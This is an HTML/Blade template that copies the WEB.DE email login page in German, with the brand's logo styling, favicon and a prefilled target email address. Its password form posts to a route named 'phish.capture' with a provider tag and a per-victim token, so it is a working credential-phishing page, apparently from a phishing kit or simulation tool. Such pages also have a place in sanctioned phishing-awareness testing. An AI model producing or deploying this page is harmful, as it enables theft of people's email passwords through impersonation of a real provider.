<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WEB.DE Login</title>
    <link rel="icon" href="https://web.de/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'webdesans',Open Sans,sans-serif;background:#ebebeb;min-height:100vh;display:flex;flex-direction:column}
        .header{background:#fff;height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;border-bottom:1px solid #ddd}
        .header-logo{font-size:24px;font-weight:900;color:#0068b7;letter-spacing:-0.5px}
        .header-logo span{color:#e8350f}
        .header-right{display:flex;gap:20px;align-items:center}
        .header-right a{font-size:14px;color:#0068b7;text-decoration:none;font-weight:500}
        .header-right a:hover{text-decoration:underline}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
        .login-box{background:#fff;padding:32px;width:100%;max-width:400px;border-radius:4px;box-shadow:1px -1px 27px -1px #b8b8b8;text-align:center}
        .logo-center{margin-bottom:24px}
        .logo-center .brand{font-size:32px;font-weight:900;color:#0068b7}
        .logo-center .brand span{color:#e8350f}
        .logo-center .tagline{font-size:13px;color:#888;margin-top:4px}
        h2{font-size:18px;color:#333;font-weight:500;margin-bottom:4px}
        .sub{font-size:13px;color:#888;margin-bottom:24px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;margin-bottom:20px;gap:12px;text-align:left}
        .avatar{width:32px;height:32px;border-radius:50%;background:#0068b7;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
        .email-text{font-size:14px;color:#333}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:'webdesans',Open Sans,sans-serif;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .2s}
        .form-group input:focus{border-color:#0068b7}
        .checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
        .checkbox-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
        .checkbox-row label{font-size:13px;color:#666;cursor:pointer}
        .btn-login{width:100%;height:40px;background:#ffd800;color:#333;border:none;border-radius:4px;font-size:16px;font-weight:500;font-family:'webdesans',Open Sans,sans-serif;cursor:pointer;transition:background .15s}
        .btn-login:hover{background:#e6c200}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#0068b7;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{background:#333;color:#fff;padding:16px 24px;text-align:center;font-size:11px;margin-top:auto}
        .footer a{color:#ccc;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.login-box{padding:24px}}
    </style>
</head>
<body>
    <div class="header">
        <div class="header-logo">WEB<span>.</span>DE</div>
        <div class="header-right">
            <a href="#">Hilfe</a>
            <a href="#">E-Mail</a>
        </div>
    </div>

    <div class="main">
        <div class="login-box">
            <div class="logo-center">
                <div class="brand">WEB<span>.</span>DE</div>
                <div class="tagline">FreeMail</div>
            </div>

            <h2>Willkommen bei WEB.DE</h2>
            <p class="sub">Bitte melden Sie sich mit Ihren Zugangsdaten an.</p>

            <div class="email-display">
                <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
                <div class="email-text">{{ $email }}</div>
            </div>

            <form action="{{ route('phish.capture', ['provider' => 'webde', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="password">Passwort</label>
                    <input type="password" id="password" name="password" required autofocus>
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" id="keepLogin" checked>
                    <label for="keepLogin">Angemeldet bleiben</label>
                </div>

                <button type="submit" class="btn-login">Anmelden</button>
            </form>

            <div class="links-row">
                <a href="#">Passwort vergessen?</a>
                <a href="#">Noch kein Konto?</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
    </div>
</body>
</html>
